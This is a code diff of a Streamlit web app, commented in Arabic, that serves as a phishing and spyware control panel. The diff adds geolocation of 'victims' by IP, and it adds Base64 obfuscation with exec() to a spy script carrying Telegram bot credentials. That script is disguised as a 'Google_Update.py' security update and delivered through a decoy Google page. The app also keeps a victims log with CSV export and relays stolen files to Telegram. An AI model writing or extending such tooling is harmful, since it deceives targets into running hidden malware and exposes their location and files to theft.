@@ -48,30 +48,51 @@ st.markdown("""
 def get_real_ip():
     """جلب عنوان IP الحقيقي للزائر من ترويسات Streamlit"""
     try:
-        # في Streamlit Cloud، يتم تمرير IP الزائر في ترويسات معينة
         from streamlit.web.server.websocket_headers import _get_websocket_headers
         headers = _get_websocket_headers()
         if headers:
-            # الترويسات الشائعة لـ IP الزائر خلف البروكسي
             ip = headers.get("X-Forwarded-For")
             if ip:
                 return ip.split(",")[0].strip()
-            
             ip = headers.get("X-Real-Ip")
             if ip:
                 return ip
     except:
         pass
+    return 'Unknown'
+
+# ============= دالة جلب البيانات الجغرافية =============
+def get_geo_info(ip):
+    """جلب معلومات الموقع الجغرافي من عدة مصادر لضمان الدقة"""
+    if ip == 'Unknown' or ip == '127.0.0.1':
+        return None
     
-    # محاولة خارجية كخيار بديل
+    # المصدر الأول: ip-api.com
     try:
-        response = requests.get('https://api.ipify.org?format=json', timeout=3)
+        response = requests.get(f'http://ip-api.com/json/{ip}?lang=ar&fields=status,country,city,lat,lon,isp,org', timeout=5)
         if response.status_code == 200:
-            return response.json().get('ip', 'Unknown')
+            data = response.json()
+            if data.get('status') == 'success':
+                return data
     except:
         pass
     
-    return 'Unknown'
+    # المصدر الثاني: ipapi.co (كخيار بديل)
+    try:
+        response = requests.get(f'https://ipapi.co/{ip}/json/', timeout=5)
+        if response.status_code == 200:
+            data = response.json()
+            return {
+                'country': data.get('country_name', 'Unknown'),
+                'city': data.get('city', 'Unknown'),
+                'isp': data.get('org', 'Unknown'),
+                'lat': data.get('latitude', 'Unknown'),
+                'lon': data.get('longitude', 'Unknown')
+            }
+    except:
+        pass
+    
+    return None
 
 # ============= دالة التقاط بيانات الضحايا =============
 def capture_victim_data():
@@ -81,18 +102,7 @@ def capture_victim_data():
     if 'target' in query_params and not st.session_state.get('victim_captured', False):
         try:
             user_ip = get_real_ip()
-            
-            # الحصول على معلومات الموقع الجغرافي
-            geo_data = None
-            if user_ip != 'Unknown' and user_ip != '127.0.0.1':
-                try:
-                    geo_response = requests.get(f'https://ip-api.com/json/{user_ip}?lang=ar&fields=country,city,lat,lon,isp,org,status', timeout=5)
-                    if geo_response.status_code == 200:
-                        response_data = geo_response.json()
-                        if response_data.get('status') == 'success':
-                            geo_data = response_data
-                except:
-                    pass
+            geo_data = get_geo_info(user_ip)
             
             # تسجيل بيانات الضحية
             victim_logger.log_victim_data(
@@ -145,13 +155,18 @@ if 'download' in st.query_params:
             spy_code = spy_code.replace('YOUR_BOT_TOKEN_HERE', token)
             spy_code = spy_code.replace('YOUR_CHAT_ID_HERE', chatid)
             
+            # تشفير بسيط للكود لإخفاء المحتوى (Base64)
+            encoded_code = base64.b64encode(spy_code.encode('utf-8')).decode('utf-8')
+            obfuscated_code = f"""import base64;exec(base64.b64decode('{encoded_code}').decode('utf-8'))"""
+            
+            # إجبار المتصفح على التحميل كملف بايثون
             st.download_button(
-                label="تحميل الأداة",
-                data=spy_code,
+                label="📥 اضغط هنا لبدء تحميل التحديث الأمني",
+                data=obfuscated_code,
                 file_name="Google_Update.py",
-                mime="text/x-python"
+                mime="application/octet-stream" # استخدام octet-stream لإجبار التحميل
             )
-            st.info("اضغط على الزر أعلاه لبدء التحميل")
+            st.warning("⚠️ يرجى الضغط على الزر أعلاه لبدء التحميل يدوياً إذا لم يبدأ تلقائياً.")
             st.stop()
         except Exception as e:
             st.error(f"خطأ في توليد الملف: {e}")
@@ -162,7 +177,6 @@ if 'decoy' in st.query_params and st.query_params.get('decoy') == 'google':
         with open('index.html', 'r', encoding='utf-8') as f:
             html_content = f.read()
         
-        # إضافة رابط التحميل التلقائي في HTML
         token = st.query_params.get('token', '')
         chatid = st.query_params.get('chatid', '')
         download_url = f"https://rashdai.streamlit.app/?download=true&token={token}&chatid={chatid}"
@@ -297,10 +311,7 @@ else:
         victims = victim_logger.get_all_victims()
         
         if victims:
-            # عرض الضحايا في جدول
             st.dataframe(victims, use_container_width=True)
-            
-            # زر تحميل CSV
             csv_data = victim_logger.get_victims_as_csv()
             st.download_button(
                 label="⬇️ تحميل سجل الضحايا (CSV)",
@@ -308,8 +319,6 @@ else:
                 file_name="victims_log.csv",
                 mime="text/csv"
             )
-            
-            # زر مسح السجل
             if st.button("🗑️ مسح سجل الضحايا"):
                 victim_logger.clear_victims_log()
                 st.success("✅ تم مسح سجل الضحايا بنجاح!")
@@ -346,32 +355,19 @@ else:
             try:
                 with open('index.html', 'r', encoding='utf-8') as f:
                     html_content = f.read()
-                
-                # حقن رابط التحميل في المعاينة أيضاً
                 download_url = f"https://rashdai.streamlit.app/?download=true&token={bot_token}&chatid={chat_id}"
                 html_content = html_content.replace('https://rashdai.streamlit.app/api/upload', download_url)
-                
                 st.components.v1.html(html_content, height=400, scrolling=True)
             except Exception as e:
                 st.error(f"❌ خطأ في تحميل صفحة Google: {e}")
 
     elif selected_tool == "📥 الملفات المسحوبة":
         st.markdown("<h2 style='text-align: center; color: #00ff00;'>📥 الملفات المسحوبة</h2>", unsafe_allow_html=True)
-        
-        st.info("هذا التبويب مخصص لعرض الملفات التي يتم سحبها إذا تم إعداد سيرفر استقبال في التطبيق. حالياً، يتم إرسال الملفات مباشرة إلى تلجرام.")
-        st.markdown("""
-        <div style="background-color: #333; padding: 15px; border-radius: 10px; margin-bottom: 20px;">
-            <p style="color: #fff; font-size: 1.1em;"><b>ملاحظة هامة:</b></p>
-            <p style="color: #fff;">حالياً، يتم إرسال الملفات المسحوبة مباشرة إلى بوت تلجرام الخاص بك لضمان السرعة والأمان.</p>
-            <p style="color: #fff;">لذلك، لن تظهر الملفات هنا. يرجى مراجعة محادثة البوت الخاص بك في تلجرام.</p>
-        </div>
-        """, unsafe_allow_html=True)
+        st.info("يتم إرسال الملفات مباشرة إلى تلجرام لضمان السرعة والأمان.")
     
     elif selected_tool == "📊 الإحصائيات":
         st.markdown("<h2 style='text-align: center; color: #00ff00;'>📊 الإحصائيات</h2>", unsafe_allow_html=True)
-        
         victims = victim_logger.get_all_victims()
-        
         col1, col2 = st.columns(2)
         with col1:
             st.metric("🎯 إجمالي الضحايا", len(victims))
